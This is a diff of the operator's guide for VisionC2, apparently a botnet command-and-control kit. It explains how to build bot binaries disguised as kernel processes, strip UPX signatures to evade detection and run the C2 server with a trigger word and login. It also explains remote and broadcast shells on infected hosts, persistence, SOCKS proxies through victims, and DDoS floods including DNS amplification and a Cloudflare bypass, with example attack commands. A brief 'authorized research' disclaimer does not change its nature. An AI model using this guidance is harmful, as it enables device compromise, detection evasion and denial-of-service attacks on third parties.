@@ -9,7 +9,8 @@
 - [Prerequisites](#-prerequisites)
 - [Building from Scratch](#-building-from-scratch)
 - [Changing C2 Address](#-changing-c2-address)
-- [Connecting to CNC Portal](#-connecting-to-cnc-portal)
+- [Starting the CNC](#-starting-the-cnc)
+- [TUI Interface](#-tui-interface)
 - [Managing Bots](#-managing-bots)
 - [Running Attacks](#-running-attacks)
 - [Rebuilding Bots Only](#-rebuilding-bots-only)
@@ -40,7 +41,7 @@ echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
 | RAM | 512MB | 2GB+ |
 | Storage | 1GB | 5GB+ |
 | OS | Linux (any distro) | Ubuntu 22.04+ / Debian 12+ |
-| Network | Open port 443 (bots) | + Admin port (default 420) |
+| Network | Open port 443 (bots) | + Admin port for split mode |
 
 ---
 
@@ -80,20 +81,10 @@ The wizard will ask for:
 | Prompt | Description | Example |
 |--------|-------------|---------|
 | **C2 Address** | Domain or IP where bots connect | `c2.example.com` or `192.168.1.100` |
-| **Admin Port** | Port for admin console connections | `420` (default) |
+| **Admin Port** | Port for admin console (split mode) | `420` (default) |
 | **Certificate Details** | For TLS cert generation | Country, State, City, Org |
 
-### Step 5: Automatic Generation
-
-The wizard automatically generates:
-
-- ✅ **Magic Code** - 16-char random authentication token
-- ✅ **Protocol Version** - Random version string (e.g., `r5.6-stable`)
-- ✅ **Crypt Seed** - 8-char hex encryption seed
-- ✅ **TLS Certificates** - 4096-bit RSA key + self-signed cert
-- ✅ **Obfuscated C2** - Multi-layer encrypted C2 address
-
-### Step 6: Build Output
+### Step 5: Build Output
 
 After completion, you'll have:
 
@@ -105,37 +96,7 @@ VisionC2/
 │   └── server.key       # TLS private key
 ├── bot/
 │   └── bins/            # 14 bot binaries (different architectures)
-│       ├── kworkerd0    # x86 (386)
-│       ├── ethd0        # x86_64 (amd64)
-│       ├── mdsync1      # ARMv7
-│       ├── ip6addrd     # ARM64
-│       └── ...          # + 10 more architectures
 └── setup_config.txt     # Your configuration summary
-```
-
-### Configuration File
-
-After setup, check `setup_config.txt` for your configuration:
-
-```
-============================================================
-VisionC2 Configuration
-============================================================
-
-[C2 Server]
-C2 Address: c2.example.com:443
-Admin Port: 420
-Bot Port: 443
-
-[Security]
-Magic Code: IhxWZGJDzdSviX$s
-Protocol Version: r5.6-stable
-
-[Usage]
-1. Start CNC: cd cnc && ./cnc
-2. Connect Admin: nc c2.example.com 420
-3. Login trigger: spamtec
-4. Bot binaries: bot/bins/
 ```
 
 ---
@@ -152,404 +113,408 @@ python3 setup.py
 # Select option [2] - Update C2 URL
 ```
 
-This will:
-
-- ✅ Re-encrypt the new C2 address with existing crypt seed
-- ✅ Update bot source code
-- ✅ Rebuild all 14 bot architectures
-- ✅ Keep your existing magic code and protocol version
-
 ### Method 2: Full Rebuild
-
-If you also want new security tokens:
 
 ```bash
 python3 setup.py
 # Select option [1] - Full Setup
 ```
 
-This regenerates everything including:
-
-- New magic code
-- New protocol version
-- New crypt seed
-- New TLS certificates
-
-### Important Notes
-
 > ⚠️ **After changing C2 address, you MUST redeploy bot binaries.**
-> Old bots will continue trying to connect to the previous C2.
-
-> ⚠️ **The bot port (443) is fixed and cannot be changed.**
-> This is intentional - port 443 blends with normal HTTPS traffic.
 
 ---
 
-## 🖥️ Connecting to CNC Portal
+## 🖥️ Starting the CNC
 
-### Step 1: Start the CNC Server
+### Default Mode: TUI Interface
 
 ```bash
 cd VisionC2/cnc
-
-# Option A: Run in foreground (for testing)
 ./cnc
+```
 
-# Option B: Run in screen session (recommended for production)
+This launches the **Terminal User Interface (TUI)** - a full-featured graphical interface in your terminal with:
+
+- Real-time bot dashboard
+- Interactive menus and forms
+- Remote shell access
+- Attack builder
+- Socks proxy manager
+- Connection logs
+
+### Split Mode: Telnet/Netcat Access
+
+For remote access or multi-user scenarios:
+
+```bash
+cd VisionC2/cnc
+./cnc --split
+```
+
+This starts the traditional telnet server on your configured admin port (default: 420). Connect with:
+
+```bash
+nc YOUR_SERVER_IP 420
+# Type trigger word: spamtec
+# Login with credentials
+```
+
+### Running in Background
+
+```bash
+# TUI mode in screen
 screen -S cnc ./cnc
 
-# To detach from screen: Ctrl+A, then D
-# To reattach: screen -r cnc
+# Split mode in screen
+screen -S cnc ./cnc --split
+
+# Detach: Ctrl+A, then D
+# Reattach: screen -r cnc
 ```
 
-### Step 2: Server Output
+### First Run
 
-When started, you'll see:
-
-```
-[INFO] Loading TLS certificates...
-[INFO] TLS configuration loaded successfully
-[☾℣☽] Bot TLS server starting on 0.0.0.0:443
-[☾℣☽] Bot TLS server is running on port 443
-[AUTH] Using magic code authentication: IhxWZGJDzdSviX$s
-[☾℣☽] Admin CLI server starting on 0.0.0.0:420
-```
-
-### Step 3: Connect to Admin Console
-
-From another terminal (can be local or remote):
-
-```bash
-# Using netcat
-nc YOUR_SERVER_IP 420
-
-# Or using telnet
-telnet YOUR_SERVER_IP 420
-```
-
-### Step 4: Authenticate
-
-1. **Type the trigger word:**
-
-   ```
-   spamtec
-   ```
-
-2. **Enter credentials:**
-
-   ```
-   ► Authentication -- Required
-   ☉ Username: root
-   ☉ Password: [your password]
-   ```
-
-3. **First-time login:**
-   - On first run, a random password is generated
-   - Check server console output for: `[☾℣☽] Login with username root and password XXXXXX`
-
-### Step 5: You're In
-
-After successful login, you'll see the VisionC2 banner and prompt:
+On first run, a root user is created with a random password:
 
 ```
-              ☾ V I S I O N ℣ C 2
-              ├─────────────────────────┤
-              │ ● Status: ONLINE        │
-              │ ◈ Bots: 47              │
-              │ ◈ Proto: r5.6-stable    │
-              │ ◈ Encrypt: TLS 1.3      │
-
-✅ Authentication Successful | Level: Owner
-
-[Owner@root]► 
+[☾℣☽] Login with username root and password XXXXXX
 ```
 
-### Quick Commands After Login
+**Save this password!** You'll need it to login.
 
-```bash
-help              # Show command menu
-attack            # Show attack methods
-bots              # List connected bots
-?                 # Quick help hint
+---
+
+## 🎨 TUI Interface
+
+The TUI is the default and recommended way to use VisionC2.
+
+### Main Dashboard
+
+```
+╔═══════════════════════════════════════════════════════════════════════╗
+║                                                                       ║
+║    ██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗ ██████╗██████╗         ║
+║    ██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║██╔════╝╚════██╗        ║
+║    ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║██║      █████╔╝        ║
+║    ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║██║     ██╔═══╝         ║
+║     ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║╚██████╗███████╗        ║
+║      ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚══════╝        ║
+║                                                                       ║
+║    Bots: 47  │  Attacks: 2  │  Uptime: 3h 25m                        ║
+╚═══════════════════════════════════════════════════════════════════════╝
+
+  ▸ 🤖 Bot List
+    ⚡ Launch Attack
+    📊 Ongoing Attacks
+    🧦 Socks Manager
+    📜 Connection Logs
+    ❓ Help
+
+  [↑/↓] Navigate  [enter] Select  [q] Quit
+```
+
+### Navigation
+
+| Key | Action |
+|-----|--------|
+| `↑` / `k` | Move up |
+| `↓` / `j` | Move down |
+| `Enter` | Select / Confirm |
+| `q` | Back / Quit |
+| `Esc` | Cancel |
+| `r` | Refresh data |
+
+### Views
+
+#### 🤖 Bot List
+
+View all connected bots with real-time status:
+
+```
+  BOT LIST                                              [47 bots online]
+
+  ▸ a1b2c3d4      192.168.1.100    amd64    4096 MB    2h 15m
+    e5f6g7h8      10.0.0.50        arm64    1024 MB    45m
+    x9y8z7w6      172.16.0.25     mips     512 MB     1h 30m
+
+  [enter] Shell  [b] Broadcast Shell  [l] Attack  [i] Info  [q] Back
+```
+
+**Hotkeys:**
+
+- `Enter` - Open remote shell to selected bot
+- `b` - Open broadcast shell (all bots)
+- `l` - Launch attack on selected bot
+- `i` - Request system info
+- `p` - Persist (with confirmation)
+- `r` - Reinstall (with confirmation)
+- `k` - Kill bot (with y/n confirmation)
+
+#### 💻 Remote Shell
+
+Interactive shell session with a single bot:
+
+```
+  💻 REMOTE SHELL
+  Bot: a1b2c3d4     │ Arch: amd64
+  ──────────────────────────────────────────────────────────
+
+  root@bot:~$ whoami
+  root
+  root@bot:~$ uname -a
+  Linux server1 5.15.0-generic x86_64 GNU/Linux
+  root@bot:~$ █
+
+  [ctrl+f] Clear  [ctrl+p] Persist  [ctrl+r] Reinstall  [esc] Exit
+```
+
+#### 📡 Broadcast Shell
+
+Send commands to ALL bots simultaneously:
+
+```
+  📡 BROADCAST SHELL                                    [47 bots]
+  ──────────────────────────────────────────────────────────
+
+  Filter: All Bots
+  broadcast:~$ █
+
+  [ctrl+a] Filter Arch  [ctrl+g] Filter RAM  [ctrl+b] Max Bots
+  [ctrl+p] Persist All  [ctrl+r] Reinstall All  [esc] Exit
+```
+
+**Targeting Filters:**
+
+- `Ctrl+A` - Filter by architecture (amd64, arm64, mips, etc.)
+- `Ctrl+G` - Filter by minimum RAM
+- `Ctrl+B` - Limit max number of bots
+
+#### ⚡ Launch Attack
+
+Interactive attack builder:
+
+```
+  ⚡ LAUNCH ATTACK
+
+  ▸ Method:    [!udpflood          ▼]
+    Target:    192.168.1.100
+    Port:      80
+    Duration:  60
+
+  [tab] Next Field  [enter] on Method to select  [l] Launch  [q] Cancel
+```
+
+#### 📊 Ongoing Attacks
+
+Monitor active attacks:
+
+```
+  ONGOING ATTACKS                                       [2 active]
+
+  !udpflood → 192.168.1.100:80     ████████░░  45s remaining
+  !https    → example.com:443      ██████████  2m 30s remaining
+
+  [s] Stop All  [r] Refresh  [q] Back
+```
+
+#### 🧦 Socks Manager
+
+Manage SOCKS5 proxies on bots:
+
+```
+  🧦 SOCKS5 PROXY MANAGER
+
+  [All Bots]  Active Socks   Stopped
+  ────────────────────────────────────────────────────────
+
+  Bots: 47   Active Proxies: 3   Bind: 0.0.0.0
+
+  BOT ID            IP              ARCH      PORT    STATUS
+  ──────────────────────────────────────────────────────────
+  ▸ a1b2c3d4       192.168.1.100   amd64     1080    ● ACTIVE
+    e5f6g7h8       10.0.0.50       arm64     1080    ● ACTIVE
+    x9y8z7w6       172.16.0.25     mips      -       - NONE
+
+  [s] Start Socks  [x] Stop Socks  [←/→] View  [r] Refresh  [q] Back
+```
+
+**Usage:**
+
+1. Select a bot with `↑/↓`
+2. Press `s` to start socks (enter port, default 1080)
+3. Connect via `socks5://BOT_IP:PORT`
+4. Press `x` to stop socks on selected bot
+
+#### 📜 Connection Logs
+
+View bot connection history:
+
+```
+  CONNECTION LOGS
+
+  [All]  Connections   Disconnections
+  ────────────────────────────────────────────────────────
+
+  14:32:05  CONNECT     a1b2c3d4    192.168.1.100    amd64
+  14:30:22  DISCONNECT  x9y8z7w6    172.16.0.25      mips
+  14:28:15  CONNECT     e5f6g7h8    10.0.0.50        arm64
+
+  [←/→] Filter  [r] Refresh  [q] Back
 ```
 
 ---
 
 ## 🤖 Managing Bots
 
-### Deploying Bots
+### Bot Binaries
 
-Bot binaries are in `bot/bins/`. Deploy the correct binary for each target architecture:
+Bot binaries are in `bot/bins/`:
 
-Here’s a **full, clean, expanded list** of all architectures in table form, based on your mapping, suitable for docs or README reference:
+| Binary | Architecture | Use Case |
+|--------|--------------|----------|
+| ethd0 | x86_64 (amd64) | Servers, desktops |
+| kworkerd0 | x86 (386) | 32-bit systems |
+| ip6addrd | ARM64 | Raspberry Pi 4, phones |
+| mdsync1 | ARMv7 | Raspberry Pi 2/3 |
+| deferwqd | MIPS | Routers |
+| devfreqd0 | MIPSLE | Routers (little-endian) |
+| *...and 8 more* | Various | IoT, embedded |
 
-| Binary Name | Architecture | GOOS  | GOARCH   | GOARM | Comments                             |
-| ----------- | ------------ | ----- | -------- | ----- | ------------------------------------ |
-| kworkerd0   | x86 (386)    | linux | 386      |       | 32-bit Intel/AMD                     |
-| ethd0       | x86_64       | linux | amd64    |       | 64-bit Intel/AMD                     |
-| mdsync1     | ARMv7        | linux | arm      | 7     | ARM 32-bit v7 (Raspberry Pi 2/3)     |
-| ksnapd0     | ARMv5        | linux | arm      | 5     | ARM 32-bit v5 (older ARM)            |
-| kswapd1     | ARMv6        | linux | arm      | 6     | ARM 32-bit v6 (Raspberry Pi 1)       |
-| ip6addrd    | ARM64        | linux | arm64    |       | ARM 64-bit (Raspberry Pi 4, Android) |
-| deferwqd    | MIPS         | linux | mips     |       | MIPS big-endian (routers)            |
-| devfreqd0   | MIPSLE       | linux | mipsle   |       | MIPS little-endian                   |
-| kintegrity0 | MIPS64       | linux | mips64   |       | MIPS 64-bit big-endian               |
-| biosd0      | MIPS64LE     | linux | mips64le |       | MIPS 64-bit little-endian            |
-| kpsmoused0  | PPC64        | linux | ppc64    |       | PowerPC 64-bit big-endian            |
-| ttmswapd    | PPC64LE      | linux | ppc64le  |       | PowerPC 64-bit little-endian         |
-| vredisd0    | s390x        | linux | s390x    |       | IBM System/390 64-bit                |
-| kvmirqd     | RISC-V 64    | linux | riscv64  |       | RISC-V 64-bit                        |
+### Bot Commands (via TUI)
 
----
+From the **Bot List** view:
 
-### Bot Connection Flow
+| Hotkey | Command | Description |
+|--------|---------|-------------|
+| `i` | `!info` | Get system information |
+| `p` | `!persist` | Setup boot persistence |
+| `r` | `!reinstall` | Force re-download |
+| `k` | `!lolnogtfo` | Kill and remove bot |
 
-```
-Bot starts → Decrypts C2 address → TLS handshake (port 443)
-    → Challenge-response auth → Registration → Ready for commands
-```
+From **Remote/Broadcast Shell**:
 
-### Monitoring Bots
-
-```bash
-[Owner@root]► bots
-[Bots: 47]
-Connected Bots:
-──────────────────────────────────────
-  ID: a1b2c3d4 | IP: 192.168.1.100:45231 | Arch: amd64 | RAM: 4.0GB
-      Uptime: 2h15m30s | Last: 5s
-```
-
-### Bot Management Commands
-
-| Command | Description | Level |
-|---------|-------------|-------|
-| `!info` | Request system info from all bots | Admin+ |
-| `!persist` | Setup boot persistence | Admin+ |
-| `!reinstall` | Force bot re-download/reinstall | Admin+ |
-| `!lolnogtfo` | Kill and remove bot | Admin+ |
+| Hotkey | Command | Description |
+|--------|---------|-------------|
+| `Ctrl+P` | `!persist` | Persistence (confirms) |
+| `Ctrl+R` | `!reinstall` | Reinstall (confirms) |
+| `Ctrl+K` | `!lolnogtfo` | Kill (broadcast only) |
 
 ---
 
 ## ⚡ Running Attacks
 
-### View Attack Methods
+### Via TUI (Recommended)
 
-```bash
-[Owner@root]► attack
-```
+1. Go to **⚡ Launch Attack** from dashboard
+2. Select attack method (press Enter on Method field)
+3. Enter target, port, duration
+4. Press `l` to launch
 
-### Attack Syntax
+### Attack Methods
 
-```
-!<method> <target> <port> <duration> [-p <proxy_url>]
-```
+**Layer 4 (Network):**
 
-### Examples
+- `!udpflood` - UDP packet flood
+- `!tcpflood` - TCP connection flood  
+- `!syn` - SYN flood
+- `!ack` - ACK flood
+- `!gre` - GRE protocol flood
+- `!dns` - DNS amplification
 
-```bash
-# Layer 4 - UDP flood
-!udpflood 192.168.1.100 80 60
+**Layer 7 (Application):**
 
-# Layer 7 - HTTPS flood
-!https example.com 443 120
+- `!http` - HTTP flood
+- `!https` - HTTPS/TLS flood
+- `!cfbypass` - Cloudflare bypass
 
-# Layer 7 with proxy
-!http target.com 443 60 -p https://proxylist.com/proxies.txt
+### Monitoring Attacks
 
-# Stop all attacks
-!stop
-```
+Go to **📊 Ongoing Attacks** to see:
 
-### Monitor Ongoing Attacks
-
-```bash
-[Owner@root]► ongoing
-Ongoing Attacks:
-  !udpflood -> 192.168.1.1:80 (45s remaining)
-  !http -> example.com:443 (2m30s remaining)
-```
+- Active attacks with progress bars
+- Time remaining
+- Press `s` to stop all attacks
 
 ---
 
 ## 🔨 Rebuilding Bots Only
-
-If you only need to rebuild bot binaries (no configuration changes):
 
 ```bash
 cd VisionC2/bot
 ./build.sh
 ```
 
-This will:
-
-- Compile for all 14 architectures
-- Apply UPX compression
-- Strip UPX signatures (anti-detection)
-- Output to `bot/bins/`
-
-### Build Output
-
-```
-Building for x86 (386)...
-Building for x86_64...
-Building for ARMv7...
-...
-All 14 builds complete!
-Built binaries saved to ./bins/:
--rwxr-xr-x 1 root root 892K kworkerd0
--rwxr-xr-x 1 root root 956K ethd0
-...
-Stripping UPX signatures from binaries...
-UPX signatures stripped successfully!
-```
+Builds all 14 architectures with UPX compression.
 
 ---
 
 ## 🔒 TLS Certificates
 
-### Default Certificate Location
+### Location
 
 ```
 VisionC2/cnc/
 ├── server.crt    # Public certificate
-└── server.key    # Private key (keep secure!)
+└── server.key    # Private key
 ```
 
-### Regenerating Certificates
+### Regenerating
 
 ```bash
-# Option 1: Via setup wizard
-python3 setup.py
-# Select [1] Full Setup
+# Via setup wizard
+python3 setup.py  # Select [1] Full Setup
 
-# Option 2: Manual generation
-cd VisionC2/cnc
+# Manual
+cd cnc
 openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
-```
-
-### Using Let's Encrypt (Production)
-
-For production with a real domain:
-
-```bash
-# Install certbot
-sudo apt install certbot
-
-# Generate certificate
-sudo certbot certonly --standalone -d c2.yourdomain.com
-
-# Copy to cnc directory
-sudo cp /etc/letsencrypt/live/c2.yourdomain.com/fullchain.pem cnc/server.crt
-sudo cp /etc/letsencrypt/live/c2.yourdomain.com/privkey.pem cnc/server.key
 ```
 
 ---
 
 ## 🔧 Troubleshooting
 
-### CNC Server Won't Start
+### TUI Won't Start
 
-**Error:** `Failed to load TLS certificates`
+**Error:** Terminal too small
 
 ```bash
-# Check certificate files exist
-ls -la cnc/server.crt cnc/server.key
-
-# Regenerate if missing
-cd cnc
-openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
+# Resize terminal to at least 80x24
+# Or use a larger terminal emulator
 ```
 
-**Error:** `Error starting bot TLS server: bind: permission denied`
+### Port 443 Permission Denied
 
 ```bash
-# Port 443 requires root
+# Option 1: Run as root
 sudo ./cnc
 
-# Or use capabilities (preferred)
+# Option 2: Set capabilities (recommended)
 sudo setcap 'cap_net_bind_service=+ep' ./cnc
 ./cnc
 ```
 
 ### Bots Not Connecting
 
-1. **Check firewall:**
-
-   ```bash
-   sudo ufw allow 443/tcp
-   sudo ufw allow YOUR_ADMIN_PORT/tcp
-   ```
-
-2. **Verify C2 address:**
-
-   ```bash
-   # Check what bots are trying to connect to
-   cat setup_config.txt | grep "C2 Address"
-   ```
-
-3. **Check DNS resolution (if using domain):**
-
-   ```bash
-   nslookup c2.yourdomain.com
-   ```
-
-4. **Test TLS connectivity:**
-
-   ```bash
-   openssl s_client -connect YOUR_SERVER:443
-   ```
-
-### Can't Connect to Admin Console
-
-1. **Check server is running:**
-
-   ```bash
-   ps aux | grep cnc
-   netstat -tlnp | grep YOUR_ADMIN_PORT
-   ```
-
-2. **Check firewall:**
-
-   ```bash
-   sudo ufw allow YOUR_ADMIN_PORT/tcp
-   ```
-
-3. **Verify connection:**
-
-   ```bash
-   nc -zv YOUR_SERVER_IP YOUR_ADMIN_PORT
-   ```
+1. Check firewall: `sudo ufw allow 443/tcp`
+2. Verify C2 in `setup_config.txt`
+3. Test TLS: `openssl s_client -connect YOUR_SERVER:443`
 
 ### Forgot Password
-
-The root password is shown on first CNC startup. If lost:
-
-1. Delete `users.json` in the cnc directory
-2. Restart CNC server
-3. New random password will be generated
 
 ```bash
 cd cnc
 rm users.json
 ./cnc
-# Look for: [☾℣☽] Login with username root and password XXXXXX
+# New password shown on startup
 ```
 
 ### Build Errors
 
-**Error:** `go: command not found`
-
 ```bash
-# Add Go to PATH
+# Go not found
 export PATH=$PATH:/usr/local/go/bin
-echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
-source ~/.bashrc
-```
 
-**Error:** `upx: command not found`
-
-```bash
+# UPX not found
 sudo apt install upx-ucl
 ```
 
@@ -557,19 +522,15 @@ sudo apt install upx-ucl
 
 ## 📚 Additional Resources
 
-- [Command Reference](cnc/COMMANDS.md) - Full command documentation
-- [Changelog](CHANGELOG.md) - Version history and updates
-- [README](README.md) - Project overview
+- [Command Reference](cnc/COMMANDS.md) - Full TUI hotkey and command reference
+- [Changelog](CHANGELOG.md) - Version history
 
 ---
 
 ## ⚖️ Legal Disclaimer
 
-VisionC2 is for **authorized security research only**. Users must:
+VisionC2 is for **authorized security research only**. Users must obtain written permission before testing any systems.
 
-1. Obtain written permission before testing any systems
-2. Only use on systems they own or have explicit authorization to test
-3. Comply with all applicable laws and regulations
-4. Not use for malicious purposes
+---
 
-The developers assume no liability for misuse.
+*VisionC2 - ☾℣☽*
